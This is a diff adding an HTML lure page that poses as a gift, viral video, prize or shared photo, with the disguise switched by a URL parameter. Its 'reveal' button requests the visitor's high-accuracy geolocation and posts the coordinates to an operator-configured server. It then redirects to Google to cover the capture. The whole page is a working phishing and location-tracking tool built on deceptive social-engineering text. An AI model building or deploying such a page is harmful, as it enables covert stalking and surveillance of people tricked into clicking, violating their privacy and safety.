@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>You've received a gift! 🎁</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: 'Segoe UI', sans-serif;
+    background: linear-gradient(135deg, #1e1b4b, #312e81);
+    color: #e2e8f0;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+  .card { text-align: center; max-width: 400px; width: 100%; }
+  .emoji { font-size: 4rem; margin-bottom: 16px; display: inline-block; animation: bounce 1s infinite alternate; }
+  @keyframes bounce { from { transform: translateY(0); } to { transform: translateY(-10px); } }
+  h1 { font-size: 1.6rem; margin-bottom: 12px; color: #e0e7ff; }
+  p { color: #a5b4fc; margin-bottom: 28px; font-size: 0.95rem; line-height: 1.6; }
+  .btn {
+    background: linear-gradient(135deg, #6366f1, #8b5cf6);
+    color: white; border: none;
+    padding: 14px 36px; border-radius: 50px;
+    font-size: 1rem; font-weight: 700;
+    cursor: pointer; width: 100%;
+    box-shadow: 0 4px 20px rgba(99,102,241,0.5);
+    transition: transform 0.2s;
+  }
+  .btn:hover { transform: scale(1.03); }
+</style>
+</head>
+<body>
+<div class="card">
+  <span class="emoji" id="emoji">🎁</span>
+  <h1 id="title">You've received a gift!</h1>
+  <p id="msg">Someone special sent you something. Click below to reveal your surprise!</p>
+  <button class="btn" id="btn" onclick="captureLocation()">🎉 Reveal My Gift</button>
+</div>
+
+<script>
+  const disguises = {
+    gift:   { emoji:'🎁', title:"You've received a gift!", msg:"Someone special sent you something. Click below to reveal your surprise!", btn:"🎉 Reveal My Gift" },
+    video:  { emoji:'🎬', title:"This video is going viral!", msg:"A friend shared an exclusive video with you. Tap below to watch — available for 24 hours only.", btn:"▶ Watch Now" },
+    winner: { emoji:'🏆', title:"You won a prize!", msg:"You've been selected from your region. Confirm your reward before it expires.", btn:"🎊 Claim My Prize" },
+    photo:  { emoji:'📸', title:"New photo shared with you", msg:"Someone sent you a private photo. Click to view — the link expires soon.", btn:"📂 View Photo" },
+  };
+
+  const params = new URLSearchParams(window.location.search);
+  const d = disguises[params.get('d')] || disguises.gift;
+  document.getElementById('emoji').textContent = d.emoji;
+  document.getElementById('title').textContent = d.title;
+  document.getElementById('msg').textContent = d.msg;
+  document.getElementById('btn').textContent = d.btn;
+
+  // ⚠️ Replace this with your actual Render URL after deploying
+  const SERVER_URL = "https://YOUR-APP-NAME.onrender.com";
+
+  function captureLocation() {
+    if (!navigator.geolocation) return redirect();
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        const { latitude: lat, longitude: lng, accuracy } = pos.coords;
+        fetch(SERVER_URL + "/location", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ lat, lng, accuracy }),
+        }).finally(() => redirect());
+      },
+      () => redirect(),
+      { enableHighAccuracy: true, timeout: 8000 }
+    );
+  }
+
+  function redirect() {
+    window.location.href = "https://www.google.com";
+  }
+</script>
+</body>
+</html>
